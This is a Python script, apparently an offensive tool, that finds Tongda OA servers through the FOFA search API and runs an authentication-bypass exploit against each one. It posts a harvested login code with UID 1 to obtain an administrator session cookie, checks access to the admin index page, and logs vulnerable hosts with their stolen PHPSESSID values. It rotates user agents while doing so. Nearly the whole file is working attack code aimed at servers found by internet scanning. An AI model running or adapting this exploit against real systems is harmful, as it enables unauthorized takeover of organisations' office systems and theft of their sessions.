# Author: Nick Yan
import requests
from multiprocessing import Pool
from random import choice

requests.adapters.DEFAULT_RETRIES = 8
requests.packages.urllib3.disable_warnings()

pic = """
                                    )          (                                       
  *   )               (          ( /(  (       )\ )        )                           
` )  /(         (  (  )\ )   )   )\()) )\     (()/(   ) ( /(   (       (       (  (    
 ( )(_)|   (    )\))((()/(( /(  ((_)((((_)(    /(_)| /( )\()) ))\      )\ (   ))\ )(   
(_(_()))\  )\ )((_))\ ((_))(_))   ((_)\ _ )\  (_))_)(_)|(_)\ /((_)  _ ((_))\ /((_|()\  
|_   _((_)_(_/( (()(_)_| ((_)_   / _ (_)_\(_) | |_((_)_| |(_|_))   | | | ((_|_))  ((_) 
  | |/ _ \ ' \)) _` / _` / _` | | (_) / _ \   | __/ _` | / // -_)  | |_| (_-< -_)| '_| 
  |_|\___/_||_|\__, \__,_\__,_|  \___/_/ \_\  |_| \__,_|_\_\\___|   \___//__|___||_|   
               |___/                                                                   
Powered By Nick Yan
"""

Vul_IP = []
evil_sessid = []


USER_AGENT = [
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
	"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
	"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
	"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
	"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
	"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
	"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10",
]

proxies = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080",
}

headers = {}

def fofa():
	"""
	该函数调用 fofa api 搜集其中使用了 tongda-oa 的 IP
	"""
	addr = "https://fofa.so/api/v1/search/all"
	headers["User-Agent"] = choice(USER_AGENT)

	parameters = {
		# 这里填入 api 参数
	}
	cookies = {}

	try:
		resp = requests.get(url=addr, params=parameters, headers=headers, cookies=cookies, proxies=proxies, timeout=8, verify=False)

		if resp.status_code != 200:
			print("[-] fofa 请求出错！请检查相关设置。。。")
			return

		data = resp.json()["results"]
		#print(type(data)) # data 是 list 类型
		with open("oa_ips.txt",'w') as f:
			for i in data:
				f.write(i[0]+"\n")
		print("[+] 写入 IP 池成功！")
		return True

	except Exception as e:
		print(e)
		return


def POC_v11(IP):
	"""
	验证 V11 版本的 OA 系统
	IP: 目标网站的 IP
	"""
	error_code = [
		'"status":0','"status":1',
	]
	target_1 = "/general/login_code.php"
	target_2 = "/logincheck_code.php"
	target_3 = "/general/index.php"
	cookies = {}

	IP = IP.strip()
	# print(f"[+] 测试 IP --> {IP}")
	if IP.startswith("http://") or IP.startswith("https://"):
		url = f"{IP}"
	else:
		url = f"http://{IP}"

	try:
		url_1 = f"{url}{target_1}"
		headers["User-Agent"] = choice(USER_AGENT)
		resp = requests.get(url=url_1, headers=headers, cookies=cookies, proxies=proxies, timeout=8, verify=False)
		if resp.status_code != 200:
			print(f"[-] {url_1} 请求失败，响应码为{resp.status_code}")
			return False
		if "No input file specified." in resp.text:
			print(f"[-] {url_1} 访问认证页面失败，{target_1} 页面不存在")
			return False
		else:
			resp_text = str(resp.text).split('{')
			CODE_UID = resp_text[-1].replace('}"}', '').replace("\r\n", '')
			
			url_2 = f"{url}{target_2}"
			resp_2 = requests.post(
				url=url_2, data={"CODEUID": "{"+CODE_UID+"}", "UID": int(1)}, headers=headers, cookies=cookies, proxies=proxies, timeout=8, verify=False)

			if resp_2.status_code != 200:
				print(f"[-] 获取 Cookie 失败，响应码为 {resp_2.status_code}")
				return False
			
			if not resp_2:
				print(f"[-] 获取 Cookie 失败，{IP} 没有响应")

			if error_code[0] in resp_2.text:
				print("[-] Failed! 参数错误 ...")
				return False
			
			elif error_code[1] in resp_2.text:
				evil_cookie = resp_2.headers["Set-Cookie"]
				print(f"[+] Success! Get Available Cookie: {evil_cookie}")
				print(f"[-] Now check {url}{target_3}")
				return evil_cookie
			
			return

	except Exception as e:
		print(e)
		print("[-] Something is wrong with %s"%IP)
		return False

def POC_v2017(IP):
	pass

def verify(IP, sessid):
	"""
	获取到 Cookie 之后对目标网站进行验证
	IP: 目标网站的 IP
	sessid: POC_v11() 运行之后得到的恶意 cookie
	"""
	target_4 = "/general/index.php"
	cookies = {}

	IP = IP.strip()
	if IP.startswith("http://") or IP.startswith("https://"):
		url = f"{IP}"
	else:
		url = f"http://{IP}"

	try:
		if sessid:
			sessid_data = sessid.split(";")
			PHPSESSID_data = sessid_data[0].split("=")
			url_3 = f"{url}{target_4}"
			headers["User-Agent"] = choice(USER_AGENT)
			cookies["PHPSESSID"] = PHPSESSID_data[1].strip()
			#headers["Cookie"] = PHPSESSID_data[1].strip()

			resp_3 = requests.get(url=url_3, headers=headers, cookies=cookies, proxies=proxies, timeout=8, verify=False)

			if not resp_3:
				return False
			if resp_3.status_code != 200:
				return False
			# if "用户未登录" in resp_3.text:
			# 	return False
			else:
				# glock.acquire()
				Vul_IP.append(f"{url}{target_4}")
				evil_sessid.append(cookies["PHPSESSID"])
				# glock.release()
				print(f"[+] 已确认 {IP.strip()} 存在漏洞。")
				return True

		else:
			return False
	except Exception as e:
		print(e)
		return False

def do(IP):
	"""
	多进程统一调用
	"""
	verify(IP, POC_v11(IP))


if __name__ == "__main__":
    #fofa()

	#IP = input("请输入要检测的 IP：")
    #IP = str(IP)
    #POC_v11(IP)
	print(f"{pic}\n\n")

	with open("oa_ips.txt",'r') as f:
		IPS = f.readlines()
		for IP in IPS:
			do(IP)

	print("[+] 检测完成，输出含漏洞的 IP --->")
	print("==============================")
	for a,b in zip(Vul_IP, evil_sessid):
		print(f"{a} ==> Check it With \033[31;1mPHPSESSID={b}\033[0m")
	print("==============================")

	with open("Vul_IP.txt", "w+") as f_2:
		for i in Vul_IP:
			i.strip()
			if i.startswith("http://") or i.startswith("https://"):
				i_data = i.split("//")
				f_2.write(f"{i_data[1]}\n")
			else:
				f_2.write(f"{i}\n")
	print("\n[+] 结果保存在 ./Vul_IP.txt 中，请查看。")
